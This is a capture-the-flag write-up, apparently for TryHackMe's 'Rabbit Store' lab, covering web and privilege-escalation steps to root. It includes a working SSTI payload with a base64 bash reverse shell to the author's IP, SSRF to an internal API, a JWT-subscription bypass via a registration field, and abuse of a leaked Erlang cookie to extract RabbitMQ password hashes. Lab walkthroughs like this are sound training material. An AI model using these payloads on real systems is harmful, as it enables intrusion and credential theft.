---
layout: post
title:  "Rabbit Store (THM)"
date:   2025-08-28 20:22:43 -0400
author: robo.uzi
tags: [TryHackMe, ctf]
---

## Initial Access

`nmap -p- -T5 -vv 10.10.242.59 -oN rabbitfullnmap.txt`

`nmap -sVC -p 22,80,4369,25672 -vv -T4 10.10.242.59 -oN rabbitnmap.txt`: 
```shell
22/tcp    open   ssh         syn-ack      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http        syn-ack      Apache httpd 2.4.52  
|_http-server-header: Apache/2.4.52 (Ubuntu)  
| http-methods:    
|_  Supported Methods: GET POST OPTIONS HEAD  
|_http-title: Site doesn't have a title (text/html).
4369/tcp  open   epmd        syn-ack      Erlang Port Mapper Daemon  
| epmd-info:    
|   epmd_port: 4369  
|   nodes:    
|_    rabbit: 25672
25672/tcp open   unknown     syn-ack
```

Add `cloudsite.thm` and `storage.cloudsite.thm` to `/etc/hosts`.

I open burpsuite to log all my traffic as I look at the webapp. I register an account on the site and login. Once Im logged in I see this text:
```
## Sorry, this service is only for internal users working within the organization and our clients. If you are one of our clients, please ask the administrator to activate your subscription.
```
I tried `X-Forwarded-For: 127.0.0.1` header and it didnt work. I see `/api/login` sets a jwt. I try to crack the secret with john... no luck.

Fuzz the api:
```shell
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 'http://storage.cloudsite.thm/api/FUZZ'

login              [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 221ms]  
register           [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 234ms]  
docs               [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 220ms]  
uploads            [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 226ms]
```
Going to `http://storage.cloudsite.thm/api/docs` shows `{"message":"Access denied"}`.

I put the `/api/register` request in burp repeater and add this to forge a jwt with an active subscription:
```t
{
	"email":"newuzi@uzi.thm",
	"password":"newpassword",
	"subscription":"active"
}
```
Now I can access `http://storage.cloudsite.thm/dashboard/active`.  You can upload a file from localhost or from url. Also on the page I see: `Note: File extensions are removed for security reasons.` This steers me away from messing with file type on upload and more towards SSRF.

I upload a file (just requested my own server `http://10.13.66.123:8000/`) and I see:
```
Success: File stored from URL successfully
File path: /api/uploads/2d7be116-5097-4d6e-adcd-e89e93512088
```
On my server I see the request:
```shell
python3 -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...  
10.10.242.59 - - [25/Aug/2025 22:35:25] "GET / HTTP/1.1" 200 -
```

I try to access `/api/docs` with `http://10.13.66.123:8000/api/docs` and browsing to `/api/uploads/af64d8cc-3502-45f5-a633-02cb465d8770` but the file I download shows a 404.

It makes a POST request to `http://storage.cloudsite.thm/api/store-url` upon upload. In the response in burpsuite I see the header `X-Powered-By: Express` which uses the default port `3000`

I make a request to `http://127.0.0.1:3000/api/docs` and then visit the link it gives me: `http://storage.cloudsite.thm/api/uploads/5b933372-1ed2-40b4-8a3c-94d0a8e6e4b7`. I download this file and see the api documentation:
```shell
cat 5b933372-1ed2-40b4-8a3c-94d0a8e6e4b7  
Endpoints Perfectly Completed  
  
POST Requests:  
/api/register - For registering user  
/api/login - For loggin in the user  
/api/upload - For uploading files  
/api/store-url - For uploadion files via url  
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.  
  
GET Requests:  
/api/uploads/filename - To view the uploaded files  
/dashboard/inactive - Dashboard for inactive user  
/dashboard/active - Dashboard for active user  
  
Note: All requests to this endpoint are sent in JSON format.
```

I make a request to `http://127.0.0.1:3000/api/fetch_messeges_from_chatbot` and see `{"message":"Token not provided"}`.

I make this request:
```shell
curl -X POST -H "Content-Type: application/json" -b "jwt=redacted" -d '{}' http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot

{  
 "error": "username parameter is required"  
}
```

I add `-d '{"username":"admin"}'` to my curl command instead of keeping it empty:
```html
<!DOCTYPE html>  
<html lang="en">  
<head>  
  <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
      <title>Greeting</title>  
</head>  
<body>  
  <h1>Sorry, admin, our chatbot server is currently under development.</h1>  
</body>  
</html>
```
{% raw %}
I change the username to bozo to see how it responds and it says this: `Sorry, bozo, our chatbot server is currently under development.` 

Ok so it directly reflects the username. I will test for SSTI.

I change the curl command with `-d '{"username":"{{3*3}}"}'`. On the dashboard it shows: `Sorry, 9, our chatbot server is currently under development.` 

SSTI is confirmed. I cause a syntax error to find it is running a flask app so it uses the Jinja2 templating engine.

To get a reverse shell I set my listener (`-nc lvnp 4444`), go to revshells.com and base64 encode a bash rev shell. I run this curl command:
```shell
curl -X POST -H "Content-Type: application/json" -b "jwt=redacted" -d '{"username":"{{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"e  
cho c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTMuNjYuMTIzLzQ0NDQgMD4mMQ==|base64 -d|bash\").read()}}"}' http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot
```

Fix my shell:
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

I get `/home/azrael/user.txt` 

___

## Privilege Escalation

No `sudo -l`. No useful suids. I run `linpeas.sh`, save the output to my machine, and look through it. I find this:
```shell
cat output.txt | grep -C 2 '.erlang.cookie'

╔══════════╣ Analyzing Erlang Files (limit 70)  
-r-----r-- 1 rabbitmq rabbitmq 16 Aug 26 06:49 /var/lib/rabbitmq/.erlang.cookie  
s50UtBF3YF6O7QBm
```

I do some research. From the nmap scan and linpeas output I know RabbitMQ is running. With the erlang cookie you can authenticate. RabbitMQ nodes have the format `rabbit@<hostname>` by default. As you can clearly see:
```shell
azrael@forge:/tmp$ hostname  
forge
```
I will add `forge` to `/etc/hosts`. 

I run `sudo apt install rabbitmq-server -y` then `sudo /usr/sbin/rabbitmqctl --erlang-cookie 's50UtBF3YF6O7QBm' --node rabbit@forge status` to see if it works. Then I look at users:
```shell
sudo rabbitmqctl --erlang-cookie 's50UtBF3YF6O7QBm' --node rabbit@forge list_users  
Listing users ...  
user    tags  
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256. []  
root    [administrator]
```

So the password for user root is the SHA 256 hash of the root user password on the RabbitMQ instance. With more research I find I can get the hash using `export_definitions`:
```shell
sudo rabbitmqctl --erlang-cookie 's50UtBF3YF6O7QBm' --node rabbit@forge export_definitions exported.json  
Exporting definitions in JSON to a file at "exported.json" ...

cat exported.json | jq | grep -C 4 hash
{  
     "hashing_algorithm": "rabbit_password_hashing_sha256",  
     "limits": {},  
     "name": "root",  
     "password_hash": "49e6-redacted-BzWF",  
     "tags": [  
       "administrator"  
     ]  
   }
```

I go to [https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm) to understand the hash I find. Here is what the official website says:

**This is the algorithm**:
- Generate a random 32 bit salt. In this example, we will use `908D C60A`. When RabbitMQ creates or updates a user, a random salt is generated.
- Prepend the generated salt with the UTF-8 representation of the desired password. If the password is `test12`, at this step, the intermediate result would be `908D C60A 7465 7374 3132`
- Take the hash (this example assumes the default [hashing function](https://www.rabbitmq.com/docs/passwords#changing-algorithm), SHA-256): `A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
- Prepend the salt again: `908D C60A A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
- Convert the value to base64 encoding: `kI3GCqW5JLMJa4iX1lo7X4D6XbYqlLgxIs30+P6tENUV2POR`
- Use the finaly base64-encoded value as the `password_hash` value in HTTP API requests and generated definition files

To get the hash first convert the base64 to hex:
```shell
echo -n '49e6-redacted-BzWF' | base64 -d | xxd -p -c 80
e3d7-redacted-3585
```

Removing the 4 byte salt from the beginning gives the actual hash: `295d-redacted-3585`

This is the password. I run `su root` and get `/root/root.txt`. The end!
{% endraw %}
___
